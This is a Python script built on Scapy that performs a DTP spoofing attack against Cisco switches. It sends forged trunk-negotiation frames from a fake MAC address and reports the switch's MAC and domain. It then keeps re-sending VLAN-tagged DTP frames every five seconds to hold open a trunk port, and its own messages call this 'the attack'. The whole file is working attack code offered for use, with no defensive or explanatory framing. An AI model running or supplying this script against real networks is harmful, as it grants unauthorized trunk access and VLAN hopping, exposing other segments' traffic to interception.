from scapy.all import *
from colorama import *
from scapy.contrib.dtp import *


def dtp_spoofing(interface):
    print(Fore.YELLOW + f"    [!] Trunk port negotiation process has started... Detecting Cisco switch...")  # Переведено
    dtp_multicast = "01:00:0c:cc:cc:cc"
    mac_for_dtp = "00:25:2e:11:22:33"
    global trunk_established
    trunk_established = False

    dtp_packet = (Dot3(src=mac_for_dtp, dst=dtp_multicast) /
                  LLC() / SNAP(OUI=0x0c, code=0x2004) /  # 0x2004 - DTP, 0x0c - Cisco
                  DTP(tlvlist=[DTPDomain(),
                               DTPStatus(status=b'\x81'),  # x81 - trunk/on
                               DTPType(dtptype=b'\xa5'),  # xa5 - 802.1q/802.1q
                               DTPNeighbor(neighbor=mac_for_dtp)]))
    sendp(dtp_packet, iface=interface, count=1, verbose=False)

    def analyze_dtp(packet):
        if packet.haslayer(DTP):
            if packet[DTPStatus].status == b'\x84' or packet[DTPStatus].status == b'\x81' or packet[DTPStatus].status == b'\x83':  # x84 - trunk/auto, x81 - trunk/on, x83 - trunk/desirable
                global trunk_established
                trunk_established = True
                src_mac = packet[Ether].src
                domain = packet[DTPDomain].domain
                string_domain = domain.decode('utf-8')
                vlan = packet[Dot1Q].vlan

                print(Fore.GREEN + f"    [+] [DETECTED]")  # Переведено
                print(Fore.GREEN + f"    [+] Trunk link established")  # Переведено
                print(Fore.GREEN + f"    [+] Switch MAC address: {src_mac.upper()}")  # Переведено
                if domain == b'\x00':
                    print(Fore.GREEN + f"    [+] Domain: <None>")  # Переведено
                else:
                    print(Fore.GREEN + f"    [+] Domain: {string_domain}")  # Переведено
                print(Fore.YELLOW + f"    [!] Do not stop the attack while DTP protocol spoofing is in progress! (Press Ctrl + C to Stop)")  # Переведено

                dtp_packet = (Ether(src=mac_for_dtp, dst=dtp_multicast) /
                              Dot1Q(vlan=vlan) /
                              LLC() / SNAP(OUI=0x0c, code=0x2004) /
                              DTP(tlvlist=[DTPDomain(domain=domain),
                                           DTPStatus(status=b'\x81'),
                                           DTPType(dtptype=b'\xa5'),
                                           DTPNeighbor(neighbor=mac_for_dtp)]))

                try:
                    while True:
                        sendp(dtp_packet, iface=interface, count=1, verbose=False)
                        time.sleep(5)
                except KeyboardInterrupt:
                    print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

    sniff(filter=f'not ether src {mac_for_dtp} and ether dst {dtp_multicast}', iface=interface, prn=analyze_dtp, store=0, timeout=5)

    if trunk_established == False:
        print(Fore.YELLOW + f"    [!] Rescanning for Cisco switches...")  # Переведено
        dtp_packet = (Dot3(src=mac_for_dtp, dst=dtp_multicast) /
                      LLC() / SNAP(OUI=0x0c, code=0x2004) /  # 0x2004 - DTP, 0x0c - Cisco
                      DTP(tlvlist=[DTPDomain(),
                                   DTPStatus(status=b'\x81'),  # x81 - trunk/on
                                   DTPType(dtptype=b'\xa5'),  # xa5 - 802.1q/802.1q
                                   DTPNeighbor(neighbor=mac_for_dtp)]))
        sendp(dtp_packet, iface=interface, count=1, verbose=False)

        def analyze_dtp(packet):
            if packet.haslayer(DTP):
                if packet[DTPStatus].status == b'\x84' or packet[DTPStatus].status == b'\x81' or packet[DTPStatus].status == b'\x83':  # x84 - trunk/auto, x81 - trunk/on, x83 - trunk/desirable
                    global trunk_established
                    trunk_established = True
                    src_mac = packet[Ether].src
                    domain = packet[DTPDomain].domain
                    string_domain = domain.decode('utf-8')
                    vlan = packet[Dot1Q].vlan

                    print(Fore.GREEN + f"    [+] [DETECTED]")  # Переведено
                    print(Fore.GREEN + f"    [+] Trunk link established")  # Переведено
                    print(Fore.GREEN + f"    [+] Switch MAC address: {src_mac.upper()}")  # Переведено
                    if domain == b'\x00':
                        print(Fore.GREEN + f"    [+] Domain: <None>")  # Переведено
                    else:
                        print(Fore.GREEN + f"    [+] Domain: {string_domain}")  # Переведено
                    print(Fore.YELLOW + f"    [!] Do not stop the attack while DTP protocol spoofing is in progress! (Press Ctrl + C to Stop)")  # Переведено

                    dtp_packet = (Ether(src=mac_for_dtp, dst=dtp_multicast) /
                                  Dot1Q(vlan=vlan) /
                                  LLC() / SNAP(OUI=0x0c, code=0x2004) /
                                  DTP(tlvlist=[DTPDomain(domain=domain),
                                               DTPStatus(status=b'\x81'),
                                               DTPType(dtptype=b'\xa5'),
                                               DTPNeighbor(neighbor=mac_for_dtp)]))
                    try:
                        while True:
                            sendp(dtp_packet, iface=interface, count=1, verbose=False)
                            time.sleep(5)
                    except KeyboardInterrupt:
                        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        sniff(filter=f'not ether src {mac_for_dtp} and ether dst {dtp_multicast}', iface=interface, prn=analyze_dtp, store=0, timeout=35)

        if trunk_established == False:
            print(Fore.RED + f"    [-] %ERROR: Trunk negotiation failed")  # Переведено